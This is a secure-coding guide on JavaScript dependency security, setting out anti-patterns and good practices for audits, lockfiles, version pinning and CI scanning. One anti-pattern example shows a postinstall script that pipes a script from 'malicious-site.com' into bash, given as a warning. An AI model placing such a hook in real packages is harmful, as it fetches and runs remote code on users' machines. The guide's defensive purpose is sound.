# Dependency Security

Never deploy with known vulnerabilities in dependencies. Outdated packages contain exploitable security flaws that attackers actively target.

**Package Manager Examples**: This document uses npm commands for illustration. Apply these principles to your package manager: npm, yarn, pnpm, or bun. Each has equivalent audit and security scanning capabilities.

## Why This Matters

Vulnerable dependencies enable:
- **Remote Code Execution**: Critical vulnerabilities allow attackers to run arbitrary code
- **Data Breaches**: SQL injection, XSS, or authentication bypass in libraries
- **Supply Chain Attacks**: Compromised packages inject malicious code
- **Known Exploits**: Public CVEs have documented attack vectors

A single outdated package with a critical vulnerability exposes your entire application. Attackers scan for known vulnerabilities using automated tools. The Log4j vulnerability (CVE-2021-44228) affected millions of applications worldwide.

## Anti-Patterns to Avoid

### ❌ NEVER: Ignore Dependency Security Warnings

```bash
# ❌ NEVER: Skip security audits
npm install  # or: yarn install, pnpm install, bun install
# 23 vulnerabilities (5 critical, 10 high, 8 moderate)
# ❌ Developer ignores warnings and deploys

# ❌ NEVER: Use --force to bypass warnings
npm install --force  # or: yarn install --force, etc.
# Ignores all warnings and installs anyway
```

**Risk:** Critical - Known vulnerabilities deployed to production

---

### ❌ NEVER: Use Wildcard Version Ranges

```json
{
  "dependencies": {
    "express": "*",
    "axios": "^1.x",
    "lodash": ">=4.0.0"
  }
}
```

**Risk:** High - Automatically pulls vulnerable versions, unpredictable behavior

---

### ❌ NEVER: Install Packages from Unknown Sources

```bash
# ❌ NEVER: Install from untrusted sources
npm install github:random-user/suspicious-package
# Applies to all package managers

# ❌ NEVER: Install packages with typosquatting names
npm install expres # Typo of "express" - could be malicious!
# Watch for common typos in popular packages

# ❌ NEVER: Install packages without checking reputation
npm install brand-new-package-no-downloads
# Package has 0 downloads, no source repo, created yesterday
```

**Risk:** Critical - Supply chain attack, malicious code execution

---

### ❌ NEVER: Run npm Scripts Without Reviewing

```json
{
  "scripts": {
    "postinstall": "curl http://malicious-site.com/steal.sh | bash"
  }
}
```

**Risk:** Critical - Malicious packages execute code during installation

---

### ❌ NEVER: Use Outdated Major Versions

```json
{
  "dependencies": {
    "express": "3.0.0",
    "mongoose": "4.0.0",
    "react": "15.0.0"
  }
}
```

**Risk:** High - Multiple known vulnerabilities, no security patches

---

## Correct Patterns

### ✅ ALWAYS: Run Security Audits Before Deployment

```bash
# ✅ Check for vulnerabilities using your package manager
npm audit          # npm
yarn audit         # yarn
pnpm audit         # pnpm
bun audit          # bun (when available)

# ✅ Fix automatically when possible
npm audit fix      # npm
yarn upgrade       # yarn
pnpm update        # pnpm

# ✅ View detailed vulnerability report
npm audit --json > audit-report.json

# ✅ Fail CI/CD if vulnerabilities found
npm audit --audit-level=moderate
yarn audit --level moderate
pnpm audit --audit-level moderate
# Exit code 1 if moderate or higher vulnerabilities found
```

**Benefit:** Identifies and fixes known vulnerabilities before deployment

**Package Manager Commands**:
- **npm**: `npm audit`, `npm audit fix`
- **yarn**: `yarn audit`, `yarn upgrade`
- **pnpm**: `pnpm audit`, `pnpm update`
- **bun**: Check docs for audit commands

---

### ✅ ALWAYS: Use Exact or Tilde Version Ranges

```json
{
  "dependencies": {
    "express": "4.18.2",
    "axios": "~1.6.0",
    "lodash": "4.17.21"
  }
}
```

**Benefit:** Predictable versions, controlled updates, easier to audit

---

### ✅ ALWAYS: Lock Dependencies with Lockfiles

```bash
# ✅ Commit lockfiles to version control (package-lock.json, yarn.lock, pnpm-lock.yaml, bun.lockb)
git add package-lock.json    # npm
git add yarn.lock            # yarn
git add pnpm-lock.yaml       # pnpm
git add bun.lockb            # bun
git commit -m "Lock dependencies"

# ✅ Use CI-optimized install commands in production/CI
npm ci           # npm: Installs exact versions from lockfile
yarn install --frozen-lockfile  # yarn: Fails if lockfile out of sync
pnpm install --frozen-lockfile  # pnpm: Fails if lockfile out of sync
bun install --frozen-lockfile   # bun: Fails if lockfile out of sync

# ❌ NEVER use regular install commands in CI/production
npm install      # Can install different versions than lockfile
yarn install     # May update lockfile
pnpm install     # May update lockfile
```

**Benefit:** Consistent installs across all environments, no version drift

---

### ✅ ALWAYS: Audit Dependencies Regularly

```typescript
// ✅ Automated dependency auditing in CI/CD
// .github/workflows/security.yml
/*
name: Security Audit
on:
  schedule:
    - cron: '0 0 * * *' # Daily
  push:
    branches: [main]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm audit --audit-level=high
*/

// ✅ Automated PRs for dependency updates
// Configure Dependabot or Renovate
// .github/dependabot.yml
/*
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
    versioning-strategy: increase
*/
```

**Benefit:** Continuous monitoring, automated security patches

---

### ✅ ALWAYS: Verify Package Integrity

```bash
# ✅ Check package reputation before installing
npm info package-name

# Output shows:
# - Download count (higher = more trusted)
# - Last publish date (recent updates good)
# - Repository URL (verify legitimate source)
# - Maintainers (check if known developers)

# ✅ Review package before installing
npm view package-name repository
# Verify GitHub URL is legitimate

npm view package-name maintainers
# Check if maintainers are known/trusted

# ✅ Check package size (suspiciously large = potential malware)
npm view package-name dist.unpackedSize
```

**Benefit:** Avoids supply chain attacks from malicious packages

---

### ✅ ALWAYS: Use npm audit in CI/CD Pipeline

```yaml
# ✅ .github/workflows/ci.yml
name: CI
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Security audit
        run: npm audit --audit-level=moderate
        # Fails if moderate or higher vulnerabilities

      - name: Check for outdated packages
        run: npm outdated || true # Warning only

  test:
    needs: security # Only run tests if security passes
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm ci
      - run: npm test
```

**Benefit:** Prevents vulnerable code from being deployed

---

### ✅ ALWAYS: Review Dependency Changes in PRs

```bash
# ✅ Check what changed in package-lock.json
git diff main -- package-lock.json

# ✅ Review dependency updates carefully
npm ls package-name # See why package is installed (direct or transitive)

# ✅ Check for unexpected dependencies
npm ls # View full dependency tree
# Look for unfamiliar packages
```

**Benefit:** Catches malicious or unexpected dependency changes

---

### ✅ ALWAYS: Minimize Dependencies

```typescript
// ❌ NEVER: Install entire library for one function
import _ from 'lodash'; // 24KB gzipped
const result = _.uniq(array);

// ✅ ALWAYS: Use native JavaScript when possible
const result = [...new Set(array)]; // Native, 0KB

// ✅ Or import specific function only
import uniq from 'lodash/uniq'; // Smaller bundle

// ❌ NEVER: Install unnecessary packages
// moment.js (232KB) when date-fns (17KB) or native Date suffices

// ✅ Evaluate necessity before installing
// - Can I use native JavaScript?
// - Is there a smaller alternative?
// - Do I really need this feature?
```

**Benefit:** Fewer dependencies = smaller attack surface, faster installs

---

### ✅ ALWAYS: Use Security Scanning Tools

```bash
# ✅ Snyk - Advanced vulnerability scanning
npm install -g snyk
snyk auth
snyk test # Scan for vulnerabilities
snyk monitor # Continuous monitoring

# ✅ npm audit alternatives
npx audit-ci --moderate # Fail CI on moderate+

# ✅ OSS Review Toolkit
npm install -g ort
ort analyze -i . -o ort-results

# ✅ Socket.dev - Supply chain security
npx socket-cli ci

# ✅ GitHub Advanced Security (if available)
# Enable in repository settings → Security → Code scanning
```

**Benefit:** More comprehensive vulnerability detection than npm audit alone

---

### ✅ ALWAYS: Monitor for Security Advisories

```bash
# ✅ Subscribe to security advisories
npm config set security-advisory-frequency daily

# ✅ GitHub Watch for security updates
# Click "Watch" → "Custom" → "Security alerts" on dependencies

# ✅ Enable GitHub Dependabot alerts
# Settings → Security & analysis → Dependabot alerts

# ✅ Follow security blogs
# - Node.js Security Releases: https://nodejs.org/en/blog/vulnerability/
# - npm Blog: https://blog.npmjs.org/
# - Snyk Vulnerability Database: https://security.snyk.io/
```

**Benefit:** Proactive notification of new vulnerabilities

---

### ✅ ALWAYS: Keep Runtime Updated

```bash
# ✅ Use LTS (Long Term Support) version for Node.js
# With nvm (Node Version Manager):
nvm install --lts
nvm use --lts

# With volta:
volta install node@lts

# With fnm (Fast Node Manager):
fnm install --lts

# ✅ Update runtime regularly
nvm install 18     # nvm
volta install node@18  # volta
fnm install 18     # fnm

# ✅ Specify runtime version in package.json
{
  "engines": {
    "node": ">=18.0.0 <19.0.0",
    "bun": ">=1.0.0"  // If using Bun
  }
}

# ✅ Use version files for consistent versions across team
echo "18" > .nvmrc           # nvm
echo "18" > .node-version    # fnm, volta
```

**Benefit:** Security patches, performance improvements, modern features

**Runtime Version Managers**:
- **nvm**: Node Version Manager (most common)
- **volta**: Fast, cross-platform version manager
- **fnm**: Fast Node Manager (written in Rust)
- **asdf**: Multi-language version manager
- **n**: Simple Node version manager

---

### ✅ ALWAYS: Verify Package Integrity

```bash
# ✅ Enable signature verification (npm 8.15.0+)
npm config set audit-signatures true

# ✅ Verify packages
npm audit signatures        # npm
yarn audit signatures       # yarn (if available)

# ✅ Check package registry signatures and checksums
npm view package-name dist.signatures
npm view package-name dist.integrity

# Package managers verify checksums automatically during install
```

**Benefit:** Ensures packages haven't been tampered with

**Integrity Checks**: All major package managers (npm, yarn, pnpm, bun) verify package integrity using checksums from lockfiles during installation.

---

## Pre-Deployment Checklist

Before deploying to production:

- [ ] Security audit run with no high or critical vulnerabilities (using your package manager's audit command)
- [ ] Lockfile committed to version control (package-lock.json, yarn.lock, pnpm-lock.yaml, or bun.lockb)
- [ ] Dependencies use exact or tilde version ranges (not wildcards)
- [ ] All direct dependencies actively maintained (check last update)
- [ ] No dependencies from unknown or untrusted sources
- [ ] Dependency count minimized (only necessary packages)
- [ ] Runtime version is latest LTS (Node.js, Bun, etc.)
- [ ] CI/CD pipeline fails on high/critical vulnerabilities
- [ ] Automated dependency updates configured (Dependabot, Renovate, or similar)
- [ ] Security advisories monitored for critical dependencies
- [ ] CI-optimized install command used in production (npm ci, yarn --frozen-lockfile, etc.)
- [ ] Transitive dependencies reviewed (using dependency tree command for your package manager)
- [ ] No packages with known malware or suspicious behavior
- [ ] Package integrity verification enabled
